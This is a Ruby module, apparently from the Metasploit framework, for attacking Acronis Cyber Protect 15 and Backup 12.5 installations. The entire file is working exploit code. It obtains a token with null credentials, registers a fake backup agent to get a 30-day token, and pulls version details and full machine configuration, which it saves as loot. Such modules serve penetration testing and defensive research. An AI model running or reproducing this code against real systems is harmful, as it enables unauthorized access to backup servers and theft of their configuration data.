# -*- coding: binary -*-

# This mixin module provides provides a way of interacting with Acronis Cyber 15 and Backup 12.5 installations

module Msf::Exploit::Remote::HTTP::AcronisCyber
  include Msf::Exploit::Remote::HttpClient

  # get the first access_token
  # @return [access_token, nil] returns first access_token or nil if not successful
  def get_access_token1
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'idp', 'token'),
      'ctype' => 'application/x-www-form-urlencoded',
      'headers' => {
        'X-Requested-With' => 'XMLHttpRequest'
      },
      'vars_post' => {
        'grant_type' => 'password',
        'username' => nil,
        'password' => nil
      }
    })
    return unless res&.code == 200
    return unless res.body.include?('access_token')

    # parse json response and return access_token
    res_json = res.get_json_document
    return if res_json.blank?

    res_json['access_token']
  end

  # register a dummy agent in Acronis Cyber Protect 12.5 and 15.0
  # @param [client_id] random generated uuid
  # @param [access_token1] first access_token
  # @return [client_secret, nil] returns client_secret or nil if not successful
  def dummy_agent_registration(client_id, access_token1)
    name = Rex::Text.rand_text_alphanumeric(5..8).downcase
    post_data = {
      client_id: client_id.to_s,
      data: { agent_type: 'backupAgent', hostname: name.to_s, is_transient: true },
      tenant_id: nil,
      token_endpoint_auth_method: 'client_secret_basic',
      type: 'agent'
    }.to_json
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'api', 'account_server', 'v2', 'clients'),
      'ctype' => 'application/json',
      'headers' => {
        'X-Requested-With' => 'XMLHttpRequest',
        'Authorization' => "bearer #{access_token1}"
      },
      'data' => post_data.to_s
    })
    return unless res&.code == 201 && res.body.include?('client_id') && res.body.include?('client_secret')

    # parse json response and return client_secret
    res_json = res.get_json_document
    return if res_json.blank?

    res_json['client_secret']
  end

  # get second access_token which is valid for 30 days
  # @param [client_id] random generated uuid
  # @param [client_secret] client_secret retrieved from a successful agent registration
  # @return [access_token, nil] returns first access_token or nil if not successful
  def get_access_token2(client_id, client_secret)
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'idp', 'token'),
      'ctype' => 'application/x-www-form-urlencoded',
      'headers' => {
        'X-Requested-With' => 'XMLHttpRequest'
      },
      'vars_post' => {
        'grant_type' => 'client_credentials',
        'client_id' => client_id.to_s,
        'client_secret' => client_secret.to_s
      }
    })
    return unless res&.code == 200
    return unless res.body.include?('access_token')

    # parse json response and return access_token
    res_json = res.get_json_document
    return if res_json.blank?

    res_json['access_token']
  end

  # returns version information
  # @param [access_token2] second access_token
  # @return [version, nil] returns version  or nil if not successful
  def get_version_info(access_token2)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'ams', 'versions'),
      'ctype' => 'application/json',
      'headers' => {
        'X-Requested-With' => 'XMLHttpRequest',
        'Authorization' => "bearer #{access_token2}"
      }
    })
    return unless res&.code == 200
    return unless res.body.include?('backendVersion')

    # parse json response and get the relevant machine info
    res_json = res.get_json_document
    return if res_json.blank?

    res_json['backendVersion']
  end

  # return all configured items in json format
  # @param [access_token2] second access_token
  # @return [res_json, nil] returns machine info in json format or nil if not successful
  def get_machine_info(access_token2)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'ams', 'resources'),
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'headers' => {
        'X-Requested-With' => 'XMLHttpRequest',
        'Authorization' => "bearer #{access_token2}"
      },
      'vars_get' => {
        'embed' => 'details'
      }
    })
    return unless res&.code == 200
    return unless res.body.include?('items') || res.body.include?('data')

    if datastore['OUTPUT'] == 'json'
      loot_path = store_loot('acronis.cyber.protect.config', 'application/json', datastore['RHOSTS'], res.body, 'configuration', 'endpoint configuration')
      print_good("Configuration details are successfully saved in json format to #{loot_path}")
    end

    # parse json response and get the relevant machine info
    res_json = res.get_json_document
    return if res_json.blank?

    res_json
  end
end
